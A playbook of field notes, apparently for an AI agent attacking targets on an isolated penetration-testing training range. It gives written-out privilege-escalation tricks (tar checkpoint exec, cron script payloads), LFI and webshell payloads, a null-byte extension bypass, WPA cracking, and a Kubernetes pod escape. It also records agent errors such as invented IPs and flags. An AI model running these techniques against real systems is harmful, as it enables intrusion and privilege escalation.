# Kali lab environment — field notes

Facts observed on the session Kali boxes. Trust this over generic memory.

## Installed tooling

Provisioned by the `pentrain_kali_agent` role (KALI_TOOLS in context lists
the live probe — anything absent there is NOT installed, don't retry it):

- recon: nmap, masscan, netdiscover, arp-scan, whatweb
- web: gobuster, ffuf, nikto, sqlmap, wpscan, curl, wget, jq
- services: smbclient, enum4linux-ng, rpcclient, ldapsearch, ftp, nc,
  socat, mysql (mariadb), psql, redis-cli, sqlite3
- creds/exploit: hydra, john, hashcat, medusa, msfconsole, evil-winrm
- pivot/remote: ssh, sshpass, expect, sshuttle, proxychains4, xfreerdp3
- files/forensics: python3 (pexpect), tcpdump, tshark, binwalk, exiftool
- wordlists: /usr/share/wordlists/ — rockyou.txt is ALREADY unzipped
  (use it directly), seclists/ is present, there is NO dirb/ dir. First
  choice for web content discovery:
  /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
  (bigger: DirBuster-2007_directory-list-2.3-medium.txt in the same dir).

## Range topology

- Targets live on an isolated /24 behind the range router (.254) — the
  router is infrastructure, never a target.
- No internet in the range: apt/pip/curl outbound all fail unless the
  session line says INTERNET: YES.
- Hostnames resolve via /etc/hosts pins: `getent hosts <name>` → real IP.
- Target VMs are MINIMAL debian — no tshark/strings/tcpdump/forensics
  tools there. Pull evidence to Kali first (`sshpass -p … scp … /tmp/` or
  `ssh … 'cat file' > /tmp/file`), analyze locally; scp needs
  `-o StrictHostKeyChecking=no` or it fails on the unknown hostkey.
- Probe tool availability ONCE per host (`command -v curl wget python3
  nc nmap`) and remember it — "command not found" NEVER fixes itself;
  retrying the same missing tool on the same host is a wasted turn.
  Fallbacks that are almost always present: python3 urllib for HTTP,
  `bash /dev/tcp/<ip>/<port>` for port probes, `cat`/`base64` for file
  transfer.

## Shell quirks that have bitten

- The pane runs zsh: `!` inside DOUBLE quotes triggers history expansion
  ("event not found"). Single-quote payloads or drop the shebang and run
  `sh script.sh`.
- `ssh host 'cmd'` has NO TTY — remote pagers (journalctl, less, man) and
  vim dump-and-exit instead of opening. Use `ssh -tt` when a sudo-NOPASSWD
  privesc needs a pager escape (`!/bin/sh`) or an editor (`:!/bin/sh`).
- `sudo` over plain ssh dies with "a terminal is required" — check the
  sudoer context ONCE via `echo 'PASS' | sudo -S -l`, don't retry variants.
- "Sorry, user X is not allowed to execute" = the account is simply not a
  sudoer — that NEVER changes mid-quest. Stop feeding it passwords and
  move the work to where you have rights (usually: pull the artifact to
  Kali, operate there).
- Scoped NOPASSWD sudo (`sudo -l` shows a pinned binary list) matches the
  BINARY sudo execs: `sudo timeout 10 airodump-ng` execs "timeout" →
  denied. Put the wrapper OUTSIDE: `timeout 60 sudo airodump-ng …`.
  Same for pipes/redirects — `sudo tool > /root/x` writes as YOU; use
  `sudo sh -c 'tool > /root/x'` only if sh itself is listed, else write
  to your own dir and sudo-cp is still off-limits — prefer /tmp or your
  home for tool output.
- `apt install` needs the session INTERNET flag — in an isolated range
  it always 404s. Before begging for net, inventory the box: the crack
  you need usually exists under a different name (see wifi/pcap below).
- Probes that can hang (ssh/nc/mysql to unverified hosts) burn a whole
  turn when they block the pane — prefix with `timeout 15`.
- A remote password prompt typed via type_in_pane is time-critical:
  sshd LoginGraceTime (~120s) kills the connection. Answer immediately,
  never queue other actions first.
- mariadb client ≠ mysql client: `mysql --skip-ssl` (not `--ssl-mode=
  DISABLED`) when the server doesn't do TLS; `-h <ip> -u user -p<pass>`
  with no space before the password.
- Non-interactive beats interactive: `smbclient -N -L //host/` and
  `smbclient //host/share -U user%pass -c 'get file'` > entering the
  smb> shell; `ftp` reads a heredoc (`ftp -n host <<EOF\nuser anonymous x\nls\nEOF`).
- enum4linux-NG ≠ enum4linux: the NG rewrite dropped `-a` — use `enum4linux-ng -A <ip>`
  (A = all simple checks). Old tutorials still say -a; it errors out.
- Report/deliverable flags: when FLAGS names a file (`*-report.md`, `*.txt`),
  write it EARLY from the evidence you have and refine — don't keep
  re-enumerating a network you already mapped. A template may sit in ~ —
  `ls ~ | grep -i template` before writing from scratch.
- sshpass present → `sshpass -p 'pass' ssh -o StrictHostKeyChecking=no
  user@host 'cmd'` runs remote commands in ONE exec (no interactive pane
  dance). Alternative without sshpass: SSH_ASKPASS trick (see prompt).
- tar wildcard privesc: checkpoint files must land INSIDE the tarred
  directory (`cd /path/spool && touch -- '--checkpoint=1'
  '--checkpoint-action=exec=sh pwn.sh'`), then POLL the output file until
  the cron run produces it — minutely crons need up to ~70s.
- Long tasks: bound every command (`--max-time 30`, `-T4 --max-retries 2`,
  `-w 5`); an unbounded curl/nc wedges the pane and costs a C-c turn.

## Web app work

- Session state lives in ONE cookie jar: `curl -c /tmp/jar -b /tmp/jar`
  on EVERY request — a fresh `-c` file per attempt discards the login you
  just did. Verify the login BEFORE exploiting: fetch a protected page
  (`/index.php`), a 302 back to login means the POST failed.
- Login forms often carry a CSRF token — a silent auth failure (every
  response is a redirect/empty page despite correct creds) usually means a
  missing hidden field. Fetch the form, extract it, POST it along:
  `tok=$(curl -s -c jar LOGIN | grep -oP "user_token' value='\K[^']+")`
  then `-d "username=..&password=..&user_token=$tok&Login=Login"`.
- LFI methodology — in this order, never skip the sanity check:
  1. `?page=../../../../etc/passwd` proves traversal works at all
  2. empty page / same page back → ADD more `../` (include() resolves
     relative to the vulnerable script's dir — an endpoint under
     /vulnerabilities/x/ needs 4-6 levels to reach filesystem root)
  3. absolute `?page=/absolute/path/file` skips the depth game entirely
  4. `php://filter/convert.base64-encode/resource=<file>` when include()
     executes/parses the file instead of printing it
- Retrying the SAME payload with cosmetic changes (new cookie file,
  added -L, same ../ count) is a loop, not iteration — change exactly
  ONE variable per attempt and keep the rest fixed.
- A POST that returns an EMPTY body is usually a 302 SUCCESS, not a
  failure — the login worked and the page lives behind the redirect.
  Follow it: `curl -sL -c /tmp/jar -b /tmp/jar -d '…' URL` or GET `/`
  with the same jar. Grepping an empty body for the flag is a dead turn.
- Exposed `.git` without git-dumper (NOT installed): mirror it with
  `wget -r -np -nH --cut-dirs=N http://IP/.git/ -P out/` (cut-dirs =
  path depth). Manual object-fetching needs `mkdir -p` for EVERY parent
  dir first — `curl -o .git/refs/heads/master` dies with exit 23 when
  `.git/refs/heads/` doesn't exist locally. A saved Apache 404 page is
  NOT a ref — `.git/refs/heads/master` returning 404 means there are no
  commits (dead end), don't re-fetch it.
- `wget -r` CANNOT enumerate `objects/` (no HTML index) — mirrors stay
  incomplete. Walk objects by hash instead (this is what git-dumper does):
  1. `curl http://IP/.git/logs/HEAD` → commit shas oldest→newest
  2. fetch `.git/objects/<first2>/<rest38>` raw → zlib-decompress:
     `curl -s URL | python3 -c "import sys,zlib;
     sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))"`
  3. `commit` object → `tree <sha>` → tree object lists `mode sha name`
     per entry (binary!) → fetch blobs → file contents
  4. cleaner: drop objects into a local `/tmp/repo/.git/objects/xx/`
     layout (mkdir -p first) + fetch HEAD/refs/config → then ordinary
     `git -C /tmp/repo log` / `git cat-file -p <sha>` work offline
- Rotated secrets: when a commit message says creds/config changed,
  diff the file ACROSS commits — the old value lives in the older
  blob (password archaeology, not the current tree).

## Credentials & access

- NEVER brute-force a credential you invented: hydra with a guessed or
  leetspeak-mutated password wastes turns and can trip lockouts. Creds
  come ONLY from artifacts literally seen in output (configs, repos,
  notes, hashes you cracked). Missing creds = unfound evidence — hunt
  the artifact, don't fuzz auth.
- A credential belongs to the service where it was found — DEPLOY_PASS
  from config.env is for ssh, NOT mysql/docker. Missing DB/service creds
  live in init.sql, docker-compose.yml, .env files — hunt them down,
  don't stuff known passwords at unrelated services.
- Group-writable script executed by root cron/timer → append a payload
  line (e.g. `cp /root/flag.txt /tmp/x; chmod 644 /tmp/x`), use the
  `wait` tool for the interval, then check the output file ONCE.
- A proven shell is also a forensic tool: before rebuilding an artifact
  offline (mirroring .git objects one by one), check whether proven
  access already reaches the SAME data on the target — `ssh host
  'git -C /var/www/app log -p'` or `git show <sha>:<file>` beats 40
  object fetches when git exists there.
- `caps:` in FACTS = primitives you already PROVED (root-exec via file,
  mysql FILE priv, valid creds). For every remaining objective check caps
  FIRST — reusing a proven primitive beats deriving a new vector. The
  cron you already hijacked can `docker cp`, `cp /root/*`, or drop
  anything else you still need.

## Containerized targets

- Without docker group or sudo, the docker CLI is a dead end — pivot to
  the exposed services/ports and looted configs instead of retrying
  `docker ps`/`docker exec`.
- Docker-internal IPs (172.16.0.0/12 ranges) are NOT reachable from
  Kali — reach them through the container host:
  `sshpass … ssh deploy@host 'curl -s http://172.x.y.z:port/'`.
- API enumeration: fetch `/` for the endpoint list, then probe each
  route with `?path=`/`?file=`/`?table=` style params — file-read
  parameters are the usual escape route into container loot.
- Reaching a downstream internal API? Read the CALLING application's
  source on the compromised host first — frontend/portal code holds the
  real contract (endpoint paths, auth headers, tokens). Blind-fuzzing
  endpoint names burns turns when the source already names them.

## Log analysis field traps

- sshd `Failed password for <user> from <ip>`: "invalid user" lines insert
  TWO fields (`for invalid user nagios from …`) — a fixed `awk '{print $11}'`
  silently counts the wrong column (s54: counted 192.0.2.99 instead of the
  real top attacker 203.0.113.44). ALWAYS extract by marker:
  `grep -oP 'from \K[0-9.]+'`. Same trap for `Accepted password`, Apache,
  sudo — anchor on the keyword, never the column number.
- Validate a parser on a SAMPLE line first (`… | head -3`), then on counts
  (`| sort | uniq -c | sort -rn | head`) — and reuse the exact pipeline
  you validated in the deliverable script; don't re-derive it.

## Webshell URL traps (?c= param style)

- NEVER append `2>&1` to a `?c=` URL — `&` splits the query, PHP only
  receives `cmd 2>` and returns an EMPTY body while the command "works".
  Stdout comes back anyway; just drop it (s61: agent debugged a working
  webshell for 15 turns because every read returned blank).
- Same for unquoted `>` in the payload: `?c=echo X > /tmp/f` makes the
  REMOTE shell apply the redirect to the echo — to inject a line that
  itself contains `>`, quote the whole payload:
  `?c=echo "cat /root/root.txt > /out" >> /opt/cron-script.sh`
- `cat` on a file returning EMPTY (with other paths printing fine) is a
  quoting/URL artifact, not missing content — suspect the `&`, not the fs.
- A "shell" on a phantom IP is never worth a second try: if a target IP
  wasn't in tool output, it doesn't exist (s61: model invented
  10.129.0.5 — re-derive with `ip route` + `nmap -sn` instead).

## Static-file extension filters (Juice Shop /ftp/ and friends)

- A dir that "Only allows .md/.pdf" checks the REQUESTED name, then stats
  the resolved path — smuggle a terminator: `/ftp/flag1.txt%2500.md`.
  `%25`→`%` survives the extension check (name ends `.md`), the second
  decode yields `flag1.txt\0.md` and the FS truncates at NUL → flag served.
- Symptom read: a direct fetch 403s with the filter error while the dir
  LISTING hides the file entirely — the file exists, the filter hides it.
  `file.md` returning `ENOENT stat '/path/file.md'` proves the check runs
  before the stat → encoding tricks reach the FS layer untouched.
- Same trick family: `file%00.md` (single decode layers), `file.md%00.txt`,
  `..;/` / `..\\` traversal when the check anchors on the wrong segment.
- Juice Shop specifics: `/ftp/quarantine/` lists `.url` bait files; the
  easter egg `eastere.gg` needs the identical `%2500.md` bypass.

## Wifi & capture cracking

- Capture where the radio is, crack where the tools are: airodump/deauth
  needs the wireless interface on the AP-side host — but `aircrack-ng`,
  `hashcat`, `john` and rockyou live on KALI. `scp` the .cap/.pcap back
  (`-o StrictHostKeyChecking=no`) and crack locally; remote sudo for the
  crack is the wrong end of the wire.
- `.cap` → hashcat: `hcxpcapngtool -o hash.22000 file.cap` then
  `hashcat -m 22000 hash.22000 wordlist`. On a CPU-only VM hashcat wants
  `-D 1` (or errors with no devices). john path: `wpapcap2john file.cap`
  then `john -w=wordlist out.john`.
- WPA cracking only yields the PSK — flags usually hide one step further:
  reuse the PSK against login surfaces (ssh users, admin panels) and read
  proof files where the quest puts them.
- Handshake capture without a client connected: `aireplay-ng --deauth`
  forces a re-auth; keep `airodump-ng` bounded (`timeout 60 airodump-ng
  -w out …`) or it fills the pane forever.
- `airmon-ng check kill` kills the lab's TRAFFIC generator too — the
  wpa_supplicant client lives inside `pentrain-wifi-ap.service`. Captures
  coming back empty right after a check-kill means you shot your own
  client: `sudo systemctl restart pentrain-wifi-ap` (scoped-allowed),
  wait ~20s for re-assoc, then capture again. Verify with
  `pgrep -a wpa_supplicant` before blaming the radio.
- WiFi-lab quests run ALL radio commands on the lab box via
  `ssh wifi@<lab>` + `sudo -S` — NEVER on Kali. If `iw dev` on Kali shows
  wlan* interfaces, you loaded `mac80211_hwsim` on the wrong host; unload
  it (`sudo modprobe -r mac80211_hwsim`) — a Kali-side monitor captures
  nothing because no lab AP is in range.
- `modprobe -r mac80211_hwsim` + bare `modprobe mac80211_hwsim` rebuilds
  with the default radios=2 and DELETES the attack interface (phy#1/wlan1)
  for good. Always reload with `radios=3`, and only after killing the
  daemons that hold the phys: `sudo pkill hostapd; sudo pkill
  wpa_supplicant` (the oneshot unit's `systemctl stop` cannot reap `-B`
  daemonized children). Then `systemctl restart pentrain-wifi-ap` and
  `iw dev` must show wlan0+wlan1+wlan2 before capturing again.
- Scoped-sudo on the lab allows single binaries only — `sudo bash -c …`
  and `sudo bash /tmp/x.sh` are denied even when every inner command is
  allowed. Chain per-command: `sudo -S pkill x; sudo -S modprobe …`.
- Non-login ssh PATH lacks /usr/sbin: bare `iw`/`airodump-ng` return
  `command not found` — always prefix with `sudo -S` (sudo's secure_path
  covers it) or call the full path.

## Pivoting & multi-hop ssh

- `sshpass -p PW ssh -J hop1 user@dest` only feeds ONE password — when the
  hops have different creds the first prompt eats it and the second hangs.
  Nest per-hop: `sshpass -p PW2 ssh -o "ProxyCommand sshpass -p PW1 ssh
  -o StrictHostKeyChecking=no -W %h:%p u1@hop1" u2@dest 'cmd'`.
- Name resolution on the forwarded hop happens on the JUMP host, not on
  Kali — `ssh … u2@db01` fails `Name or service not known` even when
  Kali's getent resolves db01. Use the destination IP instead.
- Middle boxes rarely have sshpass/expect — never assume the pivot host
  can script the second hop; drive both hops from Kali.

## Nested RCE channels (SSRF / ?cmd= endpoints)

- A `?cmd=` endpoint runs ONE shell line per request — heredocs and nested
  JSON bodies get mangled by url-encoding. Transport any multi-line /
  quote-heavy payload as base64: encode on Kali, then
  `?cmd=echo+<b64>|+base64+-d+>+/tmp/f.json` inside the target, then
  reference the file (`curl -d @/tmp/f.json`, `python3 /tmp/x.py`).
- `$(...)` inside ?cmd= runs on the TARGET — never unescape to fetch a
  token locally first; either inline it in the same cmd line or carry it
  in a follow-up request.
- K8s escape pattern: pod RCE -> SA token at
  /var/run/secrets/kubernetes.io/serviceaccount/token -> curl -k -H
  "Authorization: Bearer $T" https://kubernetes.default.svc/api/v1/... ->
  privileged pod (metadata.namespace + imagePullPolicy:IfNotPresent for
  local images + hostPath + privileged:true) -> flag via pods/<name>/log.

## Enumeration discipline

- A concrete artifact lead (exposed .git/backup/config, leaked file,
  looted creds) outranks widening enumeration — finish exploiting what
  you found before scanning further. Re-scans and re-reads of settled
  files without a new hypothesis are loops, not iteration.
- Host alive (ping/routed) but EVERY port filtered = ACL/firewall tier
  isolation — that host is reached by pivoting through a compromised
  machine or an exposed service, never by more nmap variants.
- Track where downloaded artifacts land (mirror dirs, /tmp files) —
  `find /tmp -name '.git' -o -name '*.cap' -o -name '*.txt'` recovers a
  lost working dir faster than re-downloading it.

## Agent-side tool discipline

- `check_flag` / `submit_flag` / `update_plan` are ACTIONS — typing them
  into the Kali pane returns `command not found` and burns a turn.
- A denied action carries the reason in its text — change the thing it
  names (run the script alone, re-read the mutated file) instead of
  retrying the same shape with cosmetic edits.
- `exec_in_kali` output is the only ground truth: submit only flag values
  that literally appeared in output; invented values hard-deny.
